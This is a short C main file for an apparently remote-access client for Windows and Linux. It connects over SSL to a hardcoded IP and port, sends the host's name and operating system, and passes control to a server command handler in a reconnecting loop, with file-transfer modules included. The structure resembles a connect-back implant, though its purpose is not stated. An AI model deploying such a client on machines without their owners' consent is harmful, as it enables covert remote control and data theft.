#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <openssl/ssl.h>

#ifdef _WIN64
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "Ws2_32.lib")
    #include "Windows/socket.h"
    #include "Windows/systeminfo.h"
    #include "Windows/send_receive.h"
    #include "Windows/file_transfer.h"
    #define OS "Windows"
    #else
    #include "Linux/file_transfer.h"
    #include "Linux/send_receive.h"
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include "Linux/socket.h"
    #include "Linux/systeminfo.h"
    #define OS "Linux"
#endif

#include "Generic/string_manipulation.h"
#include "Generic/server_handler.h"
#include "Generic/hash_file.h"

#define PORT 1100
#define SOCK_ADDRESS "172.21.81.193"

int main() {
    while(true) {
        puts("connecting");
        SSL* ssl = ssl_connection(PORT, SOCK_ADDRESS);
        if (ssl == NULL) {
            return EXIT_FAILURE;
        }
        puts("authenticating");
        authentication();
        char* hostname = get_hostname();
        send_data(ssl, hostname);
        send_data(ssl, OS);
        free(hostname);
        char* sniffer_dummy = receive_data(ssl);
        free(sniffer_dummy);
        puts("server handler");
        server_handler(ssl);
        #ifdef _WIN64
            closesocket(SSL_get_fd(ssl));
        #else
            close(SSL_get_fd(ssl));
        #endif
    }
}
